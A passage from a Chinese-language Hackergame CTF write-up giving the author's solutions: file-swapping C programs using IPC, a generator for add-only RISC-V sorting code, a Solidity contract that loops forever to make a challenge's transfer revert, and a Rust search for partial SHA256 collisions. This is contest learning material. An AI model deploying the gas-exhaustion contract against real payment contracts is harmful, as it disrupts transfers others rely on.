	int fd=open("/space/file",O_RDWR);
	if(fd<0){
		perror_exit("open error");
	}
	printf("a ok\n");
	char* read_start=((char*)(mem));
	char* write_start=((char*)(mem))+1024*1024;
	for(int i=0;i<128;i++){
		int segment_start=i*1024*1024;
		// 读出文件内容
		off_t read_off=lseek(fd,segment_start,SEEK_SET);
		if(read_off<0){
			perror_exit("lseek error");
		}
		int read_count=0;
		while(read_count<1024*1024){
			int read_len=read(fd,read_start+read_count,1024*1024-read_count);
			if(read_len<0){
				perror_exit("read error");
			}
			read_count+=read_len;
		}
		// 发送同步信号
		struct message out;
		out.type=1;
		if (msgsnd(mqab, &out, sizeof (struct message), 0) <0) {
			perror_exit("msgsnd error");
        }
		// 接收同步信号
		struct message in;
		if (msgrcv(mqba, &in, sizeof (struct message),0, 0) <0) {
			perror_exit("msgrcv error");
        }
		// 写回文件内容
		off_t write_off=lseek(fd,segment_start,SEEK_SET);
		if(write_off<0){
			perror_exit("lseek error");
		}
		int write_count=0;
		while(write_count<1024*1024){
			int write_len=write(fd,write_start+write_count,1024*1024-write_count);
			if(write_len<0){
				perror_exit("write error");
			}
			write_count+=write_len;
		}
	}
	printf("a complete\n");
}
```

Bob 的代码如下：
```c
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/msg.h>
#include <sys/shm.h>

void perror_exit(char* message){
	perror(message);
	exit(-1);
}

struct message {
    long type;
    char buffer[4];
};

int main()
{
	printf("b start\n");
	int mqab=msgget(12450,0666 |IPC_CREAT);
	if(mqab<0){
		perror_exit("msgget swapab error");
	}
	int mqba=msgget(12451,0666 |IPC_CREAT);
	if(mqba<0){
		perror_exit("msgget swapba error");
	}
	int shm=shmget(12452,2*1024*1024,0666 |IPC_CREAT);
	if(mqba<0){
		perror_exit("shmget error");
	}
	void* mem=shmat(shm,0,0);
	if(mem==(void*)(-1)){
		perror_exit("shmat error");
	}
	int fd=open("/space/file",O_RDWR);
	if(fd<0){
		perror_exit("open error");
	}
	printf("b ok\n");
	char* read_start=((char*)(mem))+1024*1024;
	char* write_start=((char*)(mem));
	for(int i=0;i<128;i++){
		int segment_start=i*1024*1024;
		// 接收同步信号
		struct message in;
		if (msgrcv(mqab, &in, sizeof (struct message),0, 0) <0) {
			perror_exit("msgrcv error");
        }
		// 读出文件内容
		off_t read_off=lseek(fd,segment_start,SEEK_SET);
		if(read_off<0){
			perror_exit("lseek error");
		}
		int read_count=0;
		while(read_count<1024*1024){
			int read_len=read(fd,read_start+read_count,1024*1024-read_count);
			if(read_len<0){
				perror_exit("read error");
			}
			read_count+=read_len;
		}
		// 写回文件内容
		off_t write_off=lseek(fd,segment_start,SEEK_SET);
		if(write_off<0){
			perror_exit("lseek error");
		}
		int write_count=0;
		while(write_count<1024*1024){
			int write_len=write(fd,write_start+write_count,1024*1024-write_count);
			if(write_len<0){
				perror_exit("write error");
			}
			write_count+=write_len;
		}
		// 发送同步信号
		struct message out;
		out.type=1;
		if (msgsnd(mqba, &out, sizeof (struct message), 0) <0) {
			perror_exit("msgsnd error");
        }
	}
	printf("b complete\n");
}
```

不过官方题解是直接用网络操作完成的，那样应该会更加方便一点。

## 看不见的彼方：交换空间 - 捉襟见肘

我只需要把 file1 和 file2 组装成 file，再像第一小题一样交换，然后再把 file 拆成 file1 和 file2 就好。组装的方法是把 file1 和 file2 分别从后往前一段段复制到 file 里，并把已经复制过的部分 [`ftruncate`](https://man7.org/linux/man-pages/man3/ftruncate.3p.html) 掉。拆分的方法只要反过来再来一遍就好了。

Alice 的代码如下：
```c
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/msg.h>
#include <sys/shm.h>

void perror_exit(char* message){
	perror(message);
	exit(-1);
}

struct message {
    long type;
    char buffer[4];
};

char buffer[1024*1024];

int main()
{
	printf("a start\n");
	int mqab=msgget(12450,0666 |IPC_CREAT);
	if(mqab<0){
		perror_exit("msgget swapab error");
	}
	int mqba=msgget(12451,0666 |IPC_CREAT);
	if(mqba<0){
		perror_exit("msgget swapba error");
	}
	int shm=shmget(12452,2*1024*1024,0666 |IPC_CREAT);
	if(mqba<0){
		perror_exit("shmget error");
	}
	void* mem=shmat(shm,0,0);
	if(mem==(void*)(-1)){
		perror_exit("shmat error");
	}
	int fd=open("/space/file",O_RDWR);
	if(fd<0){
		perror_exit("open fd error");
	}
	int fd1=open("/space/file1",O_RDWR|O_CREAT);
	if(fd1<0){
		perror_exit("open fd1 error");
	}
	int fd2=open("/space/file2",O_RDWR|O_CREAT);
	if(fd2<0){
		perror_exit("open fd2 error");
	}
	printf("a ok\n");
	char* read_start=((char*)(mem));
	char* write_start=((char*)(mem))+1024*1024;
	for(int i=0;i<128;i++){
		int segment_start=i*1024*1024;
		// 读出文件内容
		off_t read_off=lseek(fd,segment_start,SEEK_SET);
		if(read_off<0){
			perror_exit("lseek error");
		}
		int read_count=0;
		while(read_count<1024*1024){
			int read_len=read(fd,read_start+read_count,1024*1024-read_count);
			if(read_len<0){
				perror_exit("read error");
			}
			read_count+=read_len;
		}
		// 发送同步信号
		struct message out;
		out.type=1;
		if (msgsnd(mqab, &out, sizeof (struct message), 0) <0) {
			perror_exit("msgsnd error");
        }
		// 接收同步信号
		struct message in;
		if (msgrcv(mqba, &in, sizeof (struct message),0, 0) <0) {
			perror_exit("msgrcv error");
        }
		// 写回文件内容
		off_t write_off=lseek(fd,segment_start,SEEK_SET);
		if(write_off<0){
			perror_exit("lseek error");
		}
		int write_count=0;
		while(write_count<1024*1024){
			int write_len=write(fd,write_start+write_count,1024*1024-write_count);
			if(write_len<0){
				perror_exit("write error");
			}
			write_count+=write_len;
		}
	}
	// 把 file 前半移动到 file2
	for(int i=0;i<64;i++){
		int file2_read_start=(127-i)*1024*1024;
		int file2_write_start=(i)*1024*1024;
		// 读出文件内容
		off_t file2_read_off=lseek(fd,file2_read_start,SEEK_SET);
		if(file2_read_off<0){
			perror_exit("lseek file2 error");
		}
		int file2_read_count=0;
		while(file2_read_count<1024*1024){
			int file2_read_len=read(fd,buffer+file2_read_count,1024*1024-file2_read_count);
			if(file2_read_len<0){
				perror_exit("read file2 error");
			}
			file2_read_count+=file2_read_len;
		}
		// 写回文件内容
		off_t file2_write_off=lseek(fd2,file2_write_start,SEEK_SET);
		if(file2_write_off<0){
			perror_exit("lseek file2 error");
		}
		int file2_write_count=0;
		while(file2_write_count<1024*1024){
			int file2_write_len=write(fd2,buffer+file2_write_count,1024*1024-file2_write_count);
			if(file2_write_len<0){
				perror_exit("write file2 error");
			}
			file2_write_count+=file2_write_len;
		}
		ftruncate(fd,file2_read_start);
	}
	// 把 file 后半移动到 file1
	for(int i=0;i<64;i++){
		int file1_read_start=(63-i)*1024*1024;
		int file1_write_start=(i)*1024*1024;
		// 读出文件内容
		off_t file1_read_off=lseek(fd,file1_read_start,SEEK_SET);
		if(file1_read_off<0){
			perror_exit("lseek file1 error");
		}
		int file1_read_count=0;
		while(file1_read_count<1024*1024){
			int file1_read_len=read(fd,buffer+file1_read_count,1024*1024-file1_read_count);
			if(file1_read_len<0){
				perror_exit("read file1 error");
			}
			file1_read_count+=file1_read_len;
		}
		// 写回文件内容
		off_t file1_write_off=lseek(fd1,file1_write_start,SEEK_SET);
		if(file1_write_off<0){
			perror_exit("lseek file1 error");
		}
		int file1_write_count=0;
		while(file1_write_count<1024*1024){
			int file1_write_len=write(fd1,buffer+file1_write_count,1024*1024-file1_write_count);
			if(file1_write_len<0){
				perror_exit("write file1 error");
			}
			file1_write_count+=file1_write_len;
		}
		ftruncate(fd,file1_read_start);
	}
	printf("a complete\n");
}
```

Bob 的代码如下：
```c
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/msg.h>
#include <sys/shm.h>

void perror_exit(char* message){
	perror(message);
	exit(-1);
}

struct message {
    long type;
    char buffer[4];
};

char buffer[1024*1024];

int main()
{
	printf("b start\n");
	int mqab=msgget(12450,0666 |IPC_CREAT);
	if(mqab<0){
		perror_exit("msgget swapab error");
	}
	int mqba=msgget(12451,0666 |IPC_CREAT);
	if(mqba<0){
		perror_exit("msgget swapba error");
	}
	int shm=shmget(12452,2*1024*1024,0666 |IPC_CREAT);
	if(mqba<0){
		perror_exit("shmget error");
	}
	void* mem=shmat(shm,0,0);
	if(mem==(void*)(-1)){
		perror_exit("shmat error");
	}
	int fd=open("/space/file",O_RDWR|O_CREAT);
	if(fd<0){
		perror_exit("open fd error");
	}
	int fd1=open("/space/file1",O_RDWR);
	if(fd1<0){
		perror_exit("open fd1 error");
	}
	int fd2=open("/space/file2",O_RDWR);
	if(fd2<0){
		perror_exit("open fd2 error");
	}
	printf("b ok\n");
	// 把 file1 装到 file 的前半
	for(int i=0;i<64;i++){
		int file1_read_start=(63-i)*1024*1024;
		int file1_write_start=(i)*1024*1024;
		// 读出文件内容
		off_t file1_read_off=lseek(fd1,file1_read_start,SEEK_SET);
		if(file1_read_off<0){
			perror_exit("lseek file1 error");
		}
		int file1_read_count=0;
		while(file1_read_count<1024*1024){
			int file1_read_len=read(fd1,buffer+file1_read_count,1024*1024-file1_read_count);
			if(file1_read_len<0){
				perror_exit("read file1 error");
			}
			file1_read_count+=file1_read_len;
		}
		// 写回文件内容
		off_t file1_write_off=lseek(fd,file1_write_start,SEEK_SET);
		if(file1_write_off<0){
			perror_exit("lseek file1 error");
		}
		int file1_write_count=0;
		while(file1_write_count<1024*1024){
			int file1_write_len=write(fd,buffer+file1_write_count,1024*1024-file1_write_count);
			if(file1_write_len<0){
				perror_exit("write file1 error");
			}
			file1_write_count+=file1_write_len;
		}
		ftruncate(fd1,file1_read_start);
	}
	close(fd1);
	unlink("/space/file1");
	// 把 file2 装到 file 的后半
	for(int i=0;i<64;i++){
		int file2_read_start=(63-i)*1024*1024;
		int file2_write_start=(i+64)*1024*1024;
		// 读出文件内容
		off_t file2_read_off=lseek(fd2,file2_read_start,SEEK_SET);
		if(file2_read_off<0){
			perror_exit("lseek file2 error");
		}
		int file2_read_count=0;
		while(file2_read_count<1024*1024){
			int file2_read_len=read(fd2,buffer+file2_read_count,1024*1024-file2_read_count);
			if(file2_read_len<0){
				perror_exit("read file2 error");
			}
			file2_read_count+=file2_read_len;
		}
		// 写回文件内容
		off_t file2_write_off=lseek(fd,file2_write_start,SEEK_SET);
		if(file2_write_off<0){
			perror_exit("lseek file2 error");
		}
		int file2_write_count=0;
		while(file2_write_count<1024*1024){
			int file2_write_len=write(fd,buffer+file2_write_count,1024*1024-file2_write_count);
			if(file2_write_len<0){
				perror_exit("write file2 error");
			}
			file2_write_count+=file2_write_len;
		}
		ftruncate(fd2,file2_read_start);
	}
	close(fd2);
	unlink("/space/file2");

	char* read_start=((char*)(mem))+1024*1024;
	char* write_start=((char*)(mem));
	for(int i=0;i<128;i++){
		int segment_start=i*1024*1024;
		// 接收同步信号
		struct message in;
		if (msgrcv(mqab, &in, sizeof (struct message),0, 0) <0) {
			perror_exit("msgrcv error");
        }
		// 读出文件内容
		off_t read_off=lseek(fd,segment_start,SEEK_SET);
		if(read_off<0){
			perror_exit("lseek error");
		}
		int read_count=0;
		while(read_count<1024*1024){
			int read_len=read(fd,read_start+read_count,1024*1024-read_count);
			if(read_len<0){
				perror_exit("read error");
			}
			read_count+=read_len;
		}
		// 写回文件内容
		off_t write_off=lseek(fd,segment_start,SEEK_SET);
		if(write_off<0){
			perror_exit("lseek error");
		}
		int write_count=0;
		while(write_count<1024*1024){
			int write_len=write(fd,write_start+write_count,1024*1024-write_count);
			if(write_len<0){
				perror_exit("write error");
			}
			write_count+=write_len;
		}
		// 发送同步信号
		struct message out;
		out.type=1;
		if (msgsnd(mqba, &out, sizeof (struct message), 0) <0) {
			perror_exit("msgsnd error");
        }
	}
	printf("b complete\n");
}
```

最后获得的 flag 里提到了 `fallocate`，确实用这个的话会更方便一些。

## RISC-V：虎胆龙威 - 线程故障 / Fault in the Hart

这里的问题是如何只使用加法操作完成所有的任务。

首先，由于 `b` 系列指令几乎全都不能用，所以要想个办法实现分支操作。这可以通过跳转表实现，只要把跳转的目标位置写在相邻的两个 32 位地址，再根据是在基址基础上是加 0 还是加 4 获得目标地址所在的位置，再读取目标地址，最后用 `jalr` 跳转即可。不过，这就要求我们加载绝对地址了，为此我们还需要链接器帮我们填好绝对地址。

其次，我们需要比较操作。如果我们能做减法，并且我们可以通过移位获得符号位，我们就能作差后使用之前说过的方法分支跳转了。对于移位，我们可以通过自己加自己模拟左移一位，而 `sw` 和 `lbu` 等结合可以模拟固定位数的右移。与常数的减法可以用加上其相反数模拟。最为困难的是两个 32 位整数的比较，我们需要扩展到 33 位相减才能正确比较，而要模拟相减我们需要把被减数乘以 -1 后与减数相加。乘法倒是可以用反复的加法来模拟。由此我们便有了所有的组件。

代码如下：

```js
console.log(".section .text")
console.log("_start:")

const hex=i=>"0x"+i.toString(16)
const allocateAddress=(()=>{
	let last=0xf80
	return (count)=>{
		const next=last-count
		last=next
		return next
	}
})()

const genInst=(inst)=>console.log(`    ${inst}`)

// 根据 s0 的值跳转
const bs0=(()=>{
	const target=allocateAddress(8)
	return (label0,label1)=>{
		// s0 应当为 1 或 0
		genInst(`add s0, s0, s0`)
		genInst(`add s0, s0, s0`)
		// s0 应当为 4 或 0
		genInst(`la s1,${hex(target)}`)
		// 写入跳转目标所在地址
		genInst(`la s2,${label1}`)
		genInst(`sw s2, 4(s1)`)
		genInst(`la s2,${label0}`)
		genInst(`sw s2, (s1)`)
		genInst(`add s1, s1, s0`)// 此处选择跳转目标所在地址
		genInst(`lw s0, (s1)`)
		genInst(`jalr x0, s0, 0`)
	}
})()

// 把 s0 右移 31 位
const shiftRightS031=(()=>{
	const shiftAddress=allocateAddress(4)
	return ()=>{
		genInst(`la s1,${hex(shiftAddress)}`)
		genInst(`sw s0, (s1)`)
		genInst(`lbu s0, 3(s1)`)// 用 sw 和 lbu 右移 24 位
		genInst(`add s0, s0, s0`)// 自己加自己左移 1 位
		genInst(`sw s0, (s1)`)
		genInst(`lbu s0, 1(s1)`)// 用 sw 和 lbu 右移 8 位
	}
})()

const bgt15=(reg,labelTrue,labelFalse)=>{
	genInst(`addi s0, ${reg},${hex(2**32-16)}`)// 通过加相反数来减常数
	shiftRightS031()
	bs0(labelTrue,labelFalse)
}

const add33bit=(()=>{
	const lowBuffer=allocateAddress(4)
	return (low16des,high17des,low16src1,high17src1,low16src2,high17src2)=>{
		genInst(`add ${low16des}, ${low16src1}, ${low16src2}`)
		genInst(`add ${high17des}, ${high17src1}, ${high17src2}`)
		genInst(`la s2,${hex(lowBuffer)}`)
		genInst(`sw ${low16des}, (s2)`)
		genInst(`lhu ${low16des}, (s2)`)
		genInst(`lhu s2, 2(s2)`)
		genInst(`add ${high17des}, ${high17des}, s2`)
	}
})()

genInst("la a0, 0xf80")// a0 为输入的起点
genInst("la a1, 0xfc0")
genInst("li t0, 0")// t0 为 i
console.log("_outer_loop:")
genInst("mv t1, t0")// t1 为 j
console.log("_inner_loop:")
genInst("addi t1, t1, 1")
// t1>15?
bgt15("t1","_inner_loop_end","_inner_loop_no_break")
console.log("_inner_loop_no_break:")
genInst("mv t2, t0")
genInst("add t2, t2, t2")
genInst("add t2, t2, t2")
genInst("add t2, t2, a0")// t2 为第一个数地址
genInst("mv t3, t1")
genInst("add t3, t3, t3")
genInst("add t3, t3, t3")
genInst("add t3, t3, a0")// t3 为第二个数地址
// 加载两个数
genInst("lhu a4, (t2)")
genInst("lhu a5, 2(t2)")// 取[i]
genInst("lhu a6, (t3)")
genInst("lhu a7, 2(t3)")// 取[j]
// 算[i]-[j]
for(let i=0;i<33;i++){
	// 实际上是算[i]+0x1FFFFFFFF*[j]
	add33bit("a4","a5","a4","a5","a6","a7")
	add33bit("a6","a7","a6","a7","a6","a7")
}
genInst("mv s0, a5")
// 因为只需要右移 16 位所以先左移 15 位
for(let i=0;i<15;i++){
	genInst(`add s0, s0, s0`)
}
shiftRightS031()
bs0("_swap","_no_swap")
// 交换
console.log("_swap:")
genInst("lw a2, (t2)")
genInst("lw a3, (t3)")
genInst("mv t4, a2")
genInst("mv a2, a3")
genInst("mv a3, t4")
genInst("sw a2, (t2)")
genInst("sw a3, (t3)")
console.log("_no_swap:")
genInst(`la s0,_inner_loop`)
genInst(`jalr x0, s0, 0`)
console.log("_inner_loop_end:")
genInst("addi t0, t0, 1")
// t0>15?
bgt15("t0","_outer_loop_end","_outer_loop")
console.log("_outer_loop_end:")
// 写到输出
for(let i=0;i<16;i++){
	genInst("lw t5, (a0)")
	genInst("sw t5, (a1)")
	genInst("addi a0,a0,4")
	genInst("addi a1,a1,4")
}
console.log("_end:")
genInst("j _end")
```

链接器脚本如下：

```
ENTRY(_start)
INPUT(a.out)
MEMORY
{
  rom (rx)  : ORIGIN = 0, LENGTH = 4K
}
SECTIONS
{
  . = 0x0;
  .text : { *(.text) }
}
```

不过赛后看官方题解才发现本题中移位指令的实现并没有走 ALU，所以也是能用的。bnez 也是能用的。用上这些的话会方便很多。

## 链上转账助手 - 转账失败

只需要让 Transfer 调用失败回滚即可，我直接写了个死循环合约耗尽 gas，代码如下：

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Transfer {
	function transfer(uint256 amounts) external payable {
		uint256 i=0;
		while(0==0){
			i+=1;
		}
  }
}
```

## 哈希三碰撞 - 三碰撞之一

逆向发现它接受三个 64 比特的串，并只检查了 SHA256 后 32 比特是否相等，遂写 Rust 硬找。代码如下：

```rust
use sha2::{Sha256, Digest};

fn main() {
    let mut i=0u64;
    let mut count=0;
    loop{
        if i&0xFFFFFF==0{
            println!("Progress {}", i);
        }
        let bytes=i.to_be_bytes();
        let mut hasher = Sha256::new();
        hasher.update(bytes);
        let hash = hasher.finalize();
        if hash[0x1c]==0xe0&&hash[0x1d]==0xe8&&hash[0x1e]==0x3d&&hash[0x1f]==0xfc{
            count+=1;
            println!("Hex-encoded bytes: {}", base16ct::lower::encode_string(&i.to_be_bytes()));
            println!("Hex-encoded hash: {}", base16ct::lower::encode_string(&hash));
        }
        if count>=3{
            return
        }
        i+=1
    }
}
```

这里选取的常数来自于全零串的 SHA256，也是为了能让它一上来就能找到第一个串。如果要求结尾 32 比特全 0 那就比较难找到了。运行的时候记得开 `--release` 避免跑不完。最终结果如下：

```
Hex-encoded bytes: 0000000000000000
Hex-encoded hash: af5570f5a1810b7af78caf4bc70a660f0df51e42baf91d4de5b2328de0e83dfc
Hex-encoded bytes: 0000000289509b00
Hex-encoded hash: 3ecb9e696948827e3d3ca6a4ed32aef391c9d07969e2e16831d62fd4e0e83dfc
Hex-encoded bytes: 00000002a526adc0
Hex-encoded hash: 1b648956a0179ef7f279453035b0e1678e1bbcc7e42610ae9e390a4fe0e83dfc
```

直接提交这三个串即可。

## 关于其他未解出的题目

以上就是我所有解出的题目的 Writeup 了。这里我再大致评论一下我没解出的题目：

- 惜字如金 3.0 - 题目 C： 很可惜没有看出来 `answer_c.txt` 也是可以在检查哈希的环节中被访问的，如果看出来了可能就能做出来了。
- 优雅的不等式 - Hard：我的思路完全正确，可惜由于各种原因没法让服务端算得足够快以至于不因为超时被断开连接。太可惜了。
- Docker for Everyone Plus：使用 ZMODEM 传输镜像才是本题最大的难点（特别是对于我这种 windows 用户来说）。建议下次出题不要不经意引入这种不必要的困难。
- ZFS 文件恢复：虽然已经用上 zdb 了，但是因为对 zfs 了解不够而没有仔细检查 delete queue 所以没做出来。总之还是学习一个。
- 链上转账助手 - 转账又失败：我的思路完全正确，然后实际操作上因为一些谜之原因（可能是留给的上一层 gas 太多了，也有可能是不慎用完了 gas）没有成功。太可惜了。
- 链上转账助手 - 转账再失败：原来可以靠增大返回数据大小来完成，学到了。
- RISC-V：虎胆龙威 - 四分之三：需要处理的限制条件太多了。虽然也不是完全不能做，但是还是没有时间完成本题。不过在这样的限制下还能有解还是很震撼的。
- 动画分享 - 只要不停下 HTTP 服务，响应就会不断延伸：没有仔细审计代码，没发现它没写异步，不应该。
- 动画分享 - 希望的终端模拟器，连接着我们的羁绊：猜到了和终端模拟器有关，但是没有发现它用的是旧版本，不应该。
- LESS 文件查看器在线版：查到了 lesspipe，甚至找到了官方题解中的相关讨论的链接，但是没找到利用的方法，有些可惜。不过这题讲真是 Web 分类？放在 General 是不是更好？
- 关灯 - Impossible：想到了预先处理矩阵，但是由于时间原因没有想具体的处理方式。总之还是学习一下具体的处理。
- 我们的快排確有問題：查到了对应版本 qsort 的相关问题，但是我不是专业打 CTF 的所以没有很好的利用漏洞的方式。总之还是学习一个。
- 图灵完备的浮点数减法：没有想到处理输入输出的方式所以做不出来。总之还是学习一个。
- 哈希三碰撞 - 三碰撞之二：没有时间仔细逆向了。不过之后的步骤也挺复杂的。原来比特币的区块哈希的字节序是反过来的啊。总之还是学习一个。
- 哈希三碰撞 - 三碰撞之三：同上。
- 零知识数独 - 无解之谜：不太了解 ZK，自然注意不到 `<--` 的问题。做题的时候倒是验证了小于等于 9 的约束是没有问题的。总之还是学习一个。
- 神秘代码 2：你这个换表 Base64 太电波了，放在我们 Puzzle Hunt 界是会被喷的。为什么不大大方方告诉我们这是什么字节码呢？
- 新生赛上的零解题：我不是专业打 CTF 的所以不会。总之还是学习一个。
- 认证恢复码：没有时间仔细看具体有什么密码学问题了。总之还是学习一个。
- cat 绿色破解版：我不是专业打 CTF 的所以不会。总之还是学习一个。
- 先不说关于我从零开始独自在异世界转生成某大厂家的 LLM 龙猫女仆这件事可不可能这么离谱，发现 Hackergame 内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」 - 「就算你把我说的话全出成题目也不会赢得我的好感的哼」：多少还是猜到了应该怎么做，但是实在是没有时间研究怎么实现了。总之还是学习一个。

## 总结

今年拿到了 22 名，排名是去年的两倍。拿到了 6150/12900 分，比例上也没有往年高。不过今年有其它的事情要忙（指上班），并且今年的难度有变高了，大概我的水平还是没有变弱。

往年 Writeup 里说重新爆破一个 Tag 的事情也因为时间不够而咕了。希望下次能搞定。

总之，明年有空一定还来。